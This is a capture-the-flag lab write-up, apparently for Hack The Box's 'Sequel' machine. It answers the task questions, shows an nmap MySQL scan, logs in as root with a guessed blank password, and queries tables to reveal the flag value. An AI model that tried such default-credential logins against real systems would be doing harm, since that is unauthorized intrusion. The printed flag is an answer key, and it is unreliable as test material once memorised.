# Sequel

## Task 1

> What does the acronym SQL stand for?

structured query language

## Task 2

> During our scan, which port running mysql do we find?

3306

## Task 3
> What community-developed MySQL version is the target running?

MariaDB

```
nmap --script=mysql-info 10.129.233.146
```

```out
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-17 18:55 EDT
Nmap scan report for 10.129.233.146
Host is up (0.033s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 60
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, FoundRows, SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, SupportsTransactions, LongColumnFlag, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: cxPh8~5+v4=v\J<.nb~u
|_  Auth Plugin Name: mysql_native_password

Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
```

* MySQL Penetration Testing with Nmap - Hacking Articles  
  https://www.hackingarticles.in/mysql-penetration-testing-nmap/

## Task 4

> What switch do we need to use in order to specify a login username for the MySQL service?

-u (or --user)

`man mysql`

## Task 5

> Which username allows us to log into MariaDB without providing a password?

root

(Just guessed.)

## Task 6

> What symbol can we use to specify within the query that we want to display everything inside a table?

\*

## Task 7

> What symbol do we need to end each query with?

;

## Task 8

> Submit root flag

7b4bec00d1a39e3dd4e021ec3d915da8

First need to connect to the remote server which is running on the
default port and has a `root` account with no password.

```
mysql -u root -h 10.129.236.203
```

Once connected just look up all the databases.

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.042 sec)
```

Show the tables of each and look for a likely place to hide the flag.

```
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.034 sec)

MariaDB [htb]> describe config;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.044 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.031 sec)
```

